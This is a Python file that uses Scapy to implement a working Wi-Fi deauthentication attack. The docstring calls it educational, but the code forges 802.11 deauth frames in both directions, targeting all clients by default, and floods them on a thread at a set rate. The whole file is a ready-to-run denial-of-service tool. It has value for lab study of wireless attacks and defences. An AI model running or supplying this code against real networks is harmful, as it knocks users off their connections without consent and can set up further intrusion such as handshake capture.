from scapy.all import *
from colorama import Fore, Style
import time
import threading

class DeauthAttack:
    """Implementación educativa de ataque de desautenticación"""
    
    def __init__(self, interface, ap_bssid, client_bssid=None):
        self.interface = interface
        self.ap_bssid = ap_bssid
        self.client_bssid = client_bssid if client_bssid else 'FF:FF:FF:FF:FF:FF'
        self.running = False
        self.packet_count = 0
    
    def create_deauth_packets(self):
        """Crea paquetes de desautenticación"""
        # Paquete del AP al cliente
        pkt1 = RadioTap() / \
               Dot11(addr1=self.client_bssid, 
                     addr2=self.ap_bssid, 
                     addr3=self.ap_bssid) / \
               Dot11Deauth(reason=7)
        
        # Paquete del cliente al AP
        pkt2 = RadioTap() / \
               Dot11(addr1=self.ap_bssid, 
                     addr2=self.client_bssid, 
                     addr3=self.client_bssid) / \
               Dot11Deauth(reason=7)
        
        return pkt1, pkt2
    
    def start_attack(self, packets_per_second=10):
        """Inicia el ataque de desautenticación"""
        self.running = True
        self.packet_count = 0
        
        print(f"{Fore.RED}[!] Iniciando ataque de desautenticación")
        print(f"{Fore.YELLOW}[*] AP: {self.ap_bssid}")
        print(f"{Fore.YELLOW}[*] Cliente: {self.client_bssid}")
        print(f"{Fore.YELLOW}[*] Presiona Ctrl+C para detener")
        
        pkt1, pkt2 = self.create_deauth_packets()
        
        def send_packets():
            while self.running:
                sendp(pkt1, iface=self.interface, verbose=0)
                sendp(pkt2, iface=self.interface, verbose=0)
                self.packet_count += 2
                time.sleep(1/packets_per_second)
        
        self.thread = threading.Thread(target=send_packets)
        self.thread.start()
        
        try:
            while self.running:
                time.sleep(1)
                print(f"{Fore.CYAN}[+] Paquetes enviados: {self.packet_count}", end='\r')
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """Detiene el ataque"""
        self.running = False
        if hasattr(self, 'thread'):
            self.thread.join()
        print(f"\n{Fore.GREEN}[+] Ataque detenido")
        print(f"{Fore.YELLOW}[*] Total de paquetes enviados: {self.packet_count}")